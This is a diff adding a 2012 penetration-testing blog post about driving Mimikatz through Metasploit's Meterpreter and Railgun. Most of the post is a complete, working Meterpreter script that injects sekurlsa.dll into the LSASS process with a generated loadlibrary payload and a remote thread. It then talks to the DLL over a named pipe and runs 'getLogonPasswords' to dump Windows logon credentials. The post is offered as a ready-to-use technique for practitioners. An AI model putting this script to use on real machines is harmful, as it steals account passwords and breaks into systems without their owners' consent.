@@ -1,0 +1,96 @@
+---
+author: mubix
+comments: true
+date: 2012-06-15 14:55:55+00:00
+layout: post
+title: Integration of Mimikatz into Metasploit Stage1
+categories:
+- metasploit
+- mimikatz
+- railgun
+---
+
+One of the powers of Metasploit is it's ability to stay memory resident. Through the use of reflective DLL injection even keeping new functionality the attack loads from ever touching disk. Well, the first thing I wanted to do with Mimikatz is get to that same level.
+
+Here is my first step to that end; a railgun based Meterpreter script. Now before going all reflective with it I needed to understand how the DLL worked. Thankfully [@gentilkiwi](https://twitter.com/gentilkiwi) stepped in and stopped my head from getting bloody. In this first step we will be removing the need for the mimikatz.exe binary, still needing the DLL to be uploaded, but we'll get there in the subsequent posts.
+
+Ignore the do_cmd for now and I stepped through [remote DLL injection here](/blog/2011/5/30/remote-dll-injection-with-meterpreter.html). So the first odd lines is 
+
+```ruby
+handle = client.railgun.kernel32.CreateNamedPipeW('\\\\.\\pipe\\kiwi\\mimikatz', 'PIPE_ACCESS_DUPLEX', 'PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT', 1, 0, 0, 30000,nil)['return']
+connectedlsass = client.railgun.kernel32.ConnectNamedPipe(handle,nil)
+```
+
+Essentially these connect to the [Named Pipe](http://en.wikipedia.org/wiki/Named_pipe) that the sekurlsa.dll uses to talk to the mimikatz.exe in it's normal operation. Then we just use the windows API call "ReadFile" from there on out.
+
+```ruby
+client.railgun.kernel32.ReadFile(handle,248,248,4,nil)
+```
+
+One of the draw backs to doing this all remotely is that Railgun doesn't have the memory management insight like the Windows OS does. Being able to know when pipes are ready to be read or written to is  a bit of a challenge and the call hangs your IRB / meterpreter session if you get it wrong. I've overcome this for the initial "banner" that sekurlsa writes by knowing the exact length (248 bytes in this case) of the text. For subsequent commands like "ping" and "getLogonPasswords" I simply have to read one character at a time, which is a slow process but removes any chance of getting hung. (Two bytes for every Unicode character)
+
+If you have any questions on how/why this works or have a better way please leave your comments and questions below or hit me up on twitter!
+  
+Meterpreter Script:
+
+```ruby    
+def do_cmd(handle,cmd)
+	ucommand = Rex::Text.to_unicode(cmd)
+	sendcmd = client.railgun.kernel32.WriteFile(handle,ucommand,ucommand.size,4,nil)
+	good2go = false
+	newline = false
+	readstring = []
+	while good2go == false
+		# Have to pull data 1 unicode character at a time
+		# this is because the pipe won't write or read if
+		# too much was written or read by the "client" (us)
+		pull = client.railgun.kernel32.ReadFile(handle,2,2,4,nil)
+		# Check to see if our end of read check is there: n000 @00
+		if pull['lpBuffer'] == "@00" and newline == true
+			good2go = true
+		else
+			readstring << pull['lpBuffer']
+		end
+		
+		# Ready the newline var for previous check on next loop
+		if pull['lpBuffer'] == "n00"
+			newline = true
+		else
+			newline = false
+		end
+	end
+	
+	print_status(readstring.join(""))
+end
+
+print_status("x86 Detected - Using x86 mimikatz")
+handle = client.railgun.kernel32.CreateNamedPipeW('\\\\.\\pipe\\kiwi\\mimikatz', 'PIPE_ACCESS_DUPLEX', 'PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT', 1, 0, 0, 30000,nil)['return']
+print_status("Handle: #{handle}")
+framework.threads.spawn('injectlsass',false) {
+	pid = client.sys.process['lsass.exe']
+	print_status("LSASS located at PID: #{pid}")
+	pathtomimi = "C:\\sekurlsa.dll"
+
+	pay = client.framework.payloads.create("windows/loadlibrary")
+	pay.datastore["DLL"] = pathtomimi
+	pay.datastore["EXITFUNC"] = 'thread'
+
+	raw = pay.generate
+	targetprocess = client.sys.process.open(pid, PROCESS_ALL_ACCESS)
+	mem = targetprocess.memory.allocate(raw.length + (30024))
+	targetprocess.memory.write(mem, raw)
+	sleep(2)
+	targetprocess.thread.create(mem, 0)
+	print_status("Successfully Injected into LSASS")
+}
+print_status("Waiting for LSASS injection to complete")
+connectedlsass = client.railgun.kernel32.ConnectNamedPipe(handle,nil)
+print_status("Mimikatz has called home, ready for command")
+sleep(2)
+print_status("Reading banner")
+client.railgun.kernel32.ReadFile(handle,248,248,4,nil)
+print_status("Doing a quick ping to make sure things are working...")
+do_cmd(handle,'ping')
+print_status("If you made it this far it worked, doing getLogonPasswords")
+do_cmd(handle, 'getLogonPasswords')
+```
